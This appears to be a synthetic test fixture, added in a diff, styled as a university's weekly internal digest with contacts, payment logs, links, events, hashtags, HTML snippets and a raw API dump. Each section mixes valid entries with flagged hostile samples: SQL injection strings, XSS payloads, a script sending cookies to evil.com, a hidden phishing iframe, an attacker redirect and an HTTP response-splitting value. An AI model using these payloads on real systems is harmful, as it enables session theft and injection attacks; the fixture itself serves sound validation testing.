@@ -1,0 +1,151 @@
+============================================================================================
+ALU INTERNAL COMMUNICATIONS DIGEST — WEEK 23, 2024
+Systems Integration & Student Affairs Division
+============================================================================================
+
+SECTION 1: STAFF DIRECTORY UPDATES
+------------------------------------
+The following contact records were imported from the HR portal on 2024-06-10.
+Please report any discrepancies to records@alueducation.com or call +250 788 123 456.
+
+New staff onboarding:
+  - Dr. Amara Diallo          | amara.diallo@alueducation.com        | Ext. 4021
+  - Ms. Fatou Ndiaye          | fatou.ndiaye@alueducation.com        | +1 (415) 867-5309
+  - Mr. Kwame Asante          | k.asante@alueducation.com            | +44 20 7946 0321
+  - Intern (SI): Lena Fischer | lena.fischer@si.alueducation.com     | +49 30 901820
+  - Alumni Liaison: Tunde Oke | tunde.oke@alumni.alueducation.com    | 078-456-7890
+
+NOTE: The following addresses were flagged as INVALID during import and must NOT be processed:
+  - @alueducation.com                          (no local part)
+  - noreply@@alueducation.com                  (double @)
+  - james..bond@alueducation.com               (consecutive dots)
+  - admin@alueducation..com                    (double dot in domain)
+  - <script>alert('xss')</script>@alueducation.com   (XSS injection attempt)
+  - '; DROP TABLE users; --@alueducation.com   (SQL injection attempt)
+  - valid_looking_but_not@alueducation.org     (wrong domain — not ALU)
+
+============================================================================================
+
+SECTION 2: STUDENT FINANCIAL RECORDS — PAYMENT PROCESSING BATCH #2024-0023
+------------------------------------
+CAUTION: This section contains sensitive payment data. Handle per PCI-DSS policy.
+
+Transaction log imported from payment gateway API response (raw):
+
+  [TXN-001] Student: Amina Bah         | Card: 4111 1111 1111 1111 | Amount: $1,250.00 | Status: CLEARED
+  [TXN-002] Student: Chidi Okonkwo     | Card: 5500-0000-0000-0004 | Amount: $980.50   | Status: CLEARED
+  [TXN-003] Student: Sara Mensah       | Card: 3714 496353 98431   | Amount: €2,100.75 | Status: CLEARED
+  [TXN-004] Student: Rafael Torres     | Card: 6011111111111117     | Amount: £750.00   | Status: PENDING
+  [TXN-005] Student: Yuna Park         | Card: 9999 9999 9999 9999 | Amount: $400.00   | Status: FAILED (invalid card)
+  [TXN-006] SUSPICIOUS: Card: 1234-5678-ABCD-EFGH  | Amount: $99999 | Status: REJECTED (non-numeric)
+
+Payment processor contact: billing@alueducation.com | Support: https://payments.alueducation.com/support
+
+============================================================================================
+
+SECTION 3: DIGITAL RESOURCES & LINKS — CURATED BY THE LIBRARY TEAM
+------------------------------------
+Resources shared this week via the student portal and social channels:
+
+Academic:
+  https://www.jstor.org/stable/10.2307/1234567
+  https://scholar.google.com/scholar?q=african+leadership+university
+  http://www.openaccess.africa/resources/education/higher-ed.html
+  https://moodle.alueducation.com/course/view.php?id=4821
+  https://library.alueducation.com/databases?subject=CS&year=2024
+
+Social & Community:
+  Follow updates at https://twitter.com/alueducation and https://instagram.com/alu_education
+  Student community forum: https://community.alueducation.com/forum
+  GitHub org: https://github.com/alueducation
+
+BROKEN / SUSPICIOUS LINKS (do not follow):
+  htt://malformed-url.com/path           (invalid scheme)
+  javascript:alert('hijack')             (JS injection)
+  https://                               (no host)
+  https://evil.com/redirect?to=<iframe src="x" onerror="steal()">   (embedded HTML injection)
+
+============================================================================================
+
+SECTION 4: EVENT SCHEDULE — JUNE & JULY 2024
+------------------------------------
+All times are listed in EAT (UTC+3).
+
+  Mon 17 Jun  |  09:00 AM  |  Opening Ceremony — Main Hall
+  Mon 17 Jun  |  02:30 PM  |  Panel: "Future of Work in Africa" — Auditorium B
+  Tue 18 Jun  |  11:15 AM  |  Workshop: Data Engineering Fundamentals
+  Wed 19 Jun  |  08:00 AM  |  Morning Run & Wellness Session
+  Wed 19 Jun  |  14:00     |  Alumni Mentorship Speed Networking
+  Thu 20 Jun  |  16:45     |  Closing Keynote: Innovation & Impact
+  Fri 21 Jun  |  12:00 PM  |  Graduation Lunch — Terrace
+  Sat 22 Jun  |  25:00     |  INVALID TIME — flagged by scheduler
+
+Phone contacts for event support:
+  General info:  +250 788 000 111
+  Catering:      +1-800-555-0199
+  AV/Tech:       0722-555-678
+  International: +33 (0)1 42 86 83 26
+
+============================================================================================
+
+SECTION 5: SOCIAL MEDIA MONITORING REPORT — COMMUNITY ENGAGEMENT
+------------------------------------
+Top hashtags from student and alumni channels this week:
+
+  #ALU2024         — 1,423 mentions
+  #AfricanLeaders  — 987 mentions
+  #TechForAfrica   — 654 mentions
+  #ALUAlumni       — 502 mentions
+  #  (empty — invalid, skip)
+  #123             — 88 mentions (numeric only — borderline, flag for review)
+  #LearnGrowLead   — 441 mentions
+
+Campaigns:
+  The #GivingTuesdayALU campaign raised $48,250.00 for student scholarships.
+  Follow @alueducation across platforms. Join the conversation with #ALUCommunity.
+
+============================================================================================
+
+SECTION 6: HTML CONTENT PREVIEW — LEARNING MANAGEMENT SYSTEM SNIPPETS
+------------------------------------
+Raw HTML fragments returned from the CMS API for rendering in the student dashboard:
+
+  <h1>Welcome to ALU Learning Portal</h1>
+  <p>Please <a href="https://moodle.alueducation.com">log in</a> to access your courses.</p>
+  <div class="alert alert-warning">Your assignment is due in <strong>48 hours</strong>.</div>
+  <img src="https://cdn.alueducation.com/assets/logo.png" alt="ALU Logo" />
+  <ul>
+    <li>Introduction to Python</li>
+    <li>Data Structures & Algorithms</li>
+  </ul>
+  <br/>
+  <input type="text" name="search" placeholder="Search courses..." />
+
+POTENTIALLY UNSAFE HTML (flagged by CMS validator):
+  <script>fetch('https://evil.com/?cookie='+document.cookie)</script>
+  <iframe src="https://phishing.example.com" style="display:none"></iframe>
+  <img src="x" onerror="window.location='https://attacker.io'">
+  <a href="javascript:void(stealCredentials())">Click here</a>
+
+============================================================================================
+
+SECTION 7: MISCELLANEOUS — RAW API DUMP (unprocessed)
+------------------------------------
+The following is a raw dump returned by an external partner API. Treat ALL data as untrusted.
+
+  Contact us at: info@partner-university.edu or support@partner-university.org
+  Emergency line: 1-900-555-0100 (premium rate — do not call without approval)
+  Alumni portal: https://alumni.partner-university.edu/login
+  Tuition amount: $12,500.00 per semester; €11,300.00 for EU students
+  Installment plan: 3 × $4,166.67 or 6 × £2,083.50
+
+  Unexpected content from API (possible injection in data field):
+    name: "Robert'); DROP TABLE students; --"
+    bio: "<script>alert(document.domain)</script>"
+    redirect: "https://legit.edu\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n<html>phishing</html>"
+    card: "4000 0000 0000 <!-- injected comment --> 0002"
+
+============================================================================================
+END OF DIGEST
+Questions? Email digest-admin@alueducation.com | Website: https://www.alueducation.com
+============================================================================================
